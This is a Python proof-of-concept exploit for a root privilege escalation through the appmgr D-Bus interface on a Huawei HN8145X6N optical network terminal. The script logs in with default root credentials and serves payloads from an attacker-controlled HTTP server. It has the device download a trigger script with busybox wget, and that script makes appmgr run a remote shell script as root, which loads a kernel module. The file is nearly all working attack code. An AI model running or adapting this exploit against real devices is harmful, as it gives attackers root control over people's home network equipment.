#!/usr/bin/env python3
"""
Huawei HN8145X6N appmgr D-Bus Privilege Escalation PoC
======================================================
Author: 哈吉米
Target:
  - Huawei OptiXstar HN8145X6N (Dopra Linux R23 SPC162)
  - SAF Container framework /sbin/appmgr (UID 0)

Vulnerability Summary:
  The /sbin/appmgr daemon running as UID 0 exposes an internal D-Bus interface:
      com.ctc.appframework1.AppAgent.PostMsg
  When targeting internal diagnostic components such as "opmaintainv3", passing
  "InPlugin": 1 and "RunScript": 1 bypasses signature verification and invokes
  g_subprocess_newv to execute the script pointed to by "URL" with UID 0 (root) privileges.
"""

import http.server
import socketserver
import threading
import time
import os
import sys
import paramiko
import json

ONT_IP = "192.168.100.1"
ONT_SSH_PORT = 22
ONT_USER = "root"
ONT_PASS = "admin"
HOST_IP = "192.168.100.2"
HOST_PORT = 8888

def run_exploit():
    work_dir = os.path.dirname(os.path.abspath(__file__))

    # 1. Generate the root payload script executed by appmgr inside container
    # The output is written to /ipks/root_result.txt, which is bind-mounted from host /mnt/jffs2/plug/apps/apps/ipks/
    run_root_content = """#!/bin/sh
echo "=== APPMGR PRIVILEGE ESCALATION EXECUTED ===" > /ipks/root_result.txt
echo "Timestamp : $(date)" >> /ipks/root_result.txt
echo "Identity  : $(id)" >> /ipks/root_result.txt
echo "Process   : PID $$ (parent: $PPID)" >> /ipks/root_result.txt

# Load ring0_gate.ko if present
if [ -f /ipks/ring0_gate.ko ]; then
    echo "[*] Loading ring0_gate.ko from /ipks/..." >> /ipks/root_result.txt
    insmod /ipks/ring0_gate.ko >> /ipks/root_result.txt 2>&1
fi

# Verify kernel module status
echo "=== KERNEL MODULES ===" >> /ipks/root_result.txt
grep -E 'ring0|wifi' /proc/modules >> /ipks/root_result.txt 2>&1

echo "=== FINISHED ===" >> /ipks/root_result.txt
"""
    run_root_path = os.path.join(work_dir, "run_root.sh")
    with open(run_root_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(run_root_content)

    # 2. Build the D-Bus trigger script executed from host restricted shell
    dbus_payload = json.dumps({
        "InPlugin": 1,
        "RunScript": 1,
        "Parameter": {
            "URL": f"http://{HOST_IP}:{HOST_PORT}/run_root.sh",
            "Args": "start"
        }
    })

    trigger_dbus_content = f"""#!/bin/sh
export DBUS_SYSTEM_BUS_ADDRESS="unix:path=/var/run/dbus/system_bus_socket"
rm -f /mnt/jffs2/plug/apps/apps/ipks/root_result.txt 2>/dev/null

echo "[*] Sending PostMsg to com.ctc.appframework1 via system bus..."
/usr/bin/dbus-send --system --print-reply \\
    --dest=com.ctc.appframework1 \\
    /com/ctc/appframework1 \\
    com.ctc.appframework1.AppAgent.PostMsg \\
    string:"opmaintainv3" \\
    string:'{dbus_payload}' 2>&1
"""
    trigger_dbus_path = os.path.join(work_dir, "trigger_dbus.sh")
    with open(trigger_dbus_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(trigger_dbus_content)

    # 3. Spin up temporary staging HTTP server
    class StagingHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

    original_dir = os.getcwd()
    os.chdir(work_dir)
    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer((HOST_IP, HOST_PORT), StagingHandler)
    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    server_thread.start()
    print(f"[*] Staging server active on http://{HOST_IP}:{HOST_PORT}")

    try:
        print(f"[*] Connecting to ONT SSH ({ONT_IP}:{ONT_SSH_PORT})...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ONT_IP, port=ONT_SSH_PORT, username=ONT_USER, password=ONT_PASS, timeout=8)
        chan = ssh.invoke_shell()
        time.sleep(0.5)

        def send_and_wait(cmd, expected="#", timeout=4):
            chan.send(cmd.encode() + b"\n")
            t0 = time.time()
            buf = ""
            while time.time() - t0 < timeout:
                if chan.recv_ready():
                    buf += chan.recv(4096).decode("utf-8", "ignore")
                    if expected in buf:
                        break
                time.sleep(0.1)
            return buf

        send_and_wait("su", "SU_WAP>")
        send_and_wait("shell", "#")

        # Stage trigger script onto ONT
        print("[*] Uploading trigger script to /tmp/trigger_dbus.sh...")
        send_and_wait(f"busybox wget http://{HOST_IP}:{HOST_PORT}/trigger_dbus.sh -O /tmp/trigger_dbus.sh", "#")
        send_and_wait("busybox chmod 755 /tmp/trigger_dbus.sh", "#")

        # Execute trigger script
        print("[*] Triggering appmgr privilege escalation...")
        out_trigger = send_and_wait("sh /tmp/trigger_dbus.sh", "#", timeout=6)
        print("--- D-Bus Response ---")
        print(out_trigger.strip())
        print("-----------------------")

        # Wait for appmgr execution and read result
        print("[*] Polling execution result from shared directory...")
        time.sleep(3)
        res = send_and_wait("cat /mnt/jffs2/plug/apps/apps/ipks/root_result.txt", "#")
        print("\n=== PRIVILEGE ESCALATION RESULT ===")
        print(res.strip())
        print("===================================\n")

        ssh.close()
    finally:
        httpd.shutdown()
        httpd.server_close()
        os.chdir(original_dir)
        for temp_f in [run_root_path, trigger_dbus_path]:
            if os.path.exists(temp_f):
                os.remove(temp_f)
        print("[*] Cleanup complete.")

if __name__ == "__main__":
    run_exploit()
